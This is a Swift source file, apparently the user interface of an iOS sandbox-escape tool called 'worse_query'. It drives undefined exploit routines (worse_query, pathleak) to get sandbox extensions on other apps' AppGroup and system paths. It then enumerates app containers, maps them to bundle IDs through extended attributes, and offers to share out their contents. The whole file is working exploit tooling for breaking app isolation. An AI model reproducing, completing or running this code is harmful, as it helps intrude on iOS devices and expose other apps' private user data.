//
//  ContentView.swift
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var console = Console()
    @State private var sandboxHandle: Int64?
    @State private var path = "/private/var/mobile/Containers/Shared/AppGroup/"
    
    var body: some View {
        NavigationStack {
            Form {
                Section("Target Path") {
                    TextField("Target", text: $path)
                }
                .disabled(sandboxHandle ?? -255 > 0)
                .disableAutocorrection(true)
                .textInputAutocapitalization(.never)
                
                Section("Escape") {
                    Button("Consume Sandbox Extension") {
                        sandboxHandle = consumeExtension(path)
                    }
                    .disabled(path.isEmpty)
                    .disabled(sandboxHandle ?? -255 > 0)
                    
                    Button("Release Sandbox Extension") {
                        releaseExtension(sandboxHandle ?? -255)
                        sandboxHandle = -255
                    }
                    .disabled(sandboxHandle ?? -255 < 0)
                }
                
                Section("Utilities") {
                    ShareLink(item: URL(fileURLWithPath: path)) {
                        Text("Share Contents")
                    }
                }
                .disabled(path.isEmpty)
                
                Section("Enumeration") {
                    // Reliable, but insanely slow
                    Button("Get Paths (pathleak)") {
                        leakPaths(path)
                    }
                    // Only works on directories that can get a parent directory extension (AppGroup and System on 27.x)
                    Button("Get Paths (parentdir)") {
                        listPaths(path)
                    }
                 }
                .disabled(path.isEmpty)
                
                Section("Log") {
                    ScrollViewReader { proxy in
                        ScrollView {
                            Text(console.output)
                                .font(.system(.footnote, design: .monospaced))
                                .textSelection(.enabled)
                                .fixedSize(horizontal: false, vertical: true)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .id("bottom")
                        }
                        .frame(height: 240)
                        .onChange(of: console.output) { _, _ in
                            withAnimation {
                                proxy.scrollTo("bottom", anchor: .bottom)
                            }
                        }
                    }
                    Button("Clear") {
                        console.output = ""
                        print("hello (again)")
                    }
                }
            }
            .navigationTitle("worse_query")
            .navigationBarTitleDisplayMode(.inline)
            .onAppear() {
                console.start()
            }
        }
    }
    
    func leakPaths(_ filter: String) {
        let files = FileManager.default
        let baselineURL = files.temporaryDirectory.appendingPathComponent(".baseline_\(UUID().uuidString)")
        var baselineInode: UInt64 = 0
        do {
            try "helloworld".write(to: baselineURL, atomically: true, encoding: .utf8)
            var baselineInfo = stat()
            let baselinePath = baselineURL.path
            
            if stat(baselinePath, &baselineInfo) == 0 {
                baselineInode = baselineInfo.st_ino
                print("baseline: \(baselineInode)")
            } else {
                print("Failed to get baseline inode!")
            }
            
            try files.removeItem(at: baselineURL)
        } catch {
            print("Failed to get baseline inode: \(error)")
            return
        }
        
        print("This is gonna take a while...")
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            let paths = pathleak(filter, baselineInode) ?? []
            print(paths.count)
            for path in paths {
                let handle = consumeExtension(path)
                if handle > 0 {
                    var buf = [CChar](repeating: 0, count: 512)
                    let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                    if len > 0 {
                        let bundleID = String(cString: buf)
                        print()
                        print(bundleID + ": " + path)
                        print()
                    }
                    releaseExtension(handle)
                }
            }
            print("Done!")
        }
    }
    
    func listPaths(_ path: String) {
        let handle = consumeExtension(path)
        if handle < 0 {
            print("Failed to get parent directory extension!")
            return
        }
        
        let files = FileManager.default
        let root = URL(filePath: path)
        
        var collected: [String] = []
        
        do {
            let enumerated = try files.contentsOfDirectory(at: root, includingPropertiesForKeys: [.isDirectoryKey], options: [.skipsHiddenFiles])
            
            for fileURL in enumerated {
                let resourceValues = try fileURL.resourceValues(forKeys: [.isDirectoryKey])
                if resourceValues.isDirectory == true {
                    collected.append(fileURL.path)
                }
            }
        } catch {
            print("Failed to load enumerate directories!")
        }
        
        for path in collected {
            print(path)
            var buf = [CChar](repeating: 0, count: 512)
            let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
            if len > 0 {
                let bundleID = String(cString: buf)
                print()
                print(bundleID + ": " + path)
                print()
            }
        }
        
        releaseExtension(handle)
    }
    
    func consumeExtension(_ path: String) -> Int64 {
        if sandboxHandle ?? -255 > 0 {
            print("already consumed sandbox token!")
            return sandboxHandle ?? -255
        }
        
        var handle: Int64 = -255
        if path.contains("/var/mobile/Containers/Shared/AppGroup") && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26 {
            handle = worse_query(path, "group.cc.forcequit.worse-query", true, false)
        } else {
            handle = worse_query(path, "group.cc.forcequit.worse-query", false, false)
        }
        switch handle {
        case -1:
            print("failed to access group!")
        case -2:
            print("failed to resolve functions!")
        case -3:
            print("failed to create query!")
        case -4:
            print("failed to create symlink!")
        case -5:
            print("query rejected!")
        case -6:
            print("kernel refused extension issue!")
        case -255:
            print("target doesn't exist!")
        default:
            print("handle: \(handle)")
        }
        return handle
    }

    func releaseExtension(_ handle: Int64) {
        if handle < 0 {
            print("sandbox extension hasn't been consumed!")
            return
        }
        worse_query_release(handle)
        print("released sandbox extension!")
    }
}
